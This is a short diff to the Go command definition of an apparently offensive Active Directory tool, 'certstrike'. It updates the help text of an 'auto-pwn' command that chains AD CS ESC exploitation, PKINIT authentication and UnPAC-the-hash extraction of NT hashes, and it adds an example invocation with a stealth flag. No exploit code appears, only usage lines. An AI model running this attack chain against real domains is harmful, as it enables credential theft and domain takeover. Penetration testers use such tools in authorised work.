@@ -12,10 +12,12 @@ var autoCmd = &cobra.Command{
 	Use:   "auto",
 	Short: "Auto-pwn — enumerate, exploit, forge in one command",
 	Long: `Automatically enumerate all ESC vulnerabilities, exploit the highest-scoring
-path, forge a certificate, and output PKINIT commands.
+path, perform PKINIT authentication with the enrolled certificate, and extract the
+NT hash via UnPAC-the-hash. Full attack chain: enumerate → exploit → PKINIT → TGT → NT hash.
 
 Examples:
   certstrike auto --target-dc dc01 --domain contoso.com --upn admin@contoso.com -u user -p pass
+  certstrike auto --target-dc dc01 --domain contoso.com --upn admin@contoso.com -u user -p pass --ldaps --stealth
   certstrike auto --dry-run --target-dc dc01 --domain contoso.com --upn admin@contoso.com -u user -p pass
   certstrike auto --target-dc dc01 --domain contoso.com --upn admin@contoso.com --attacker-dn user -u user -p pass`,
 	RunE: func(cmd *cobra.Command, args []string) error {
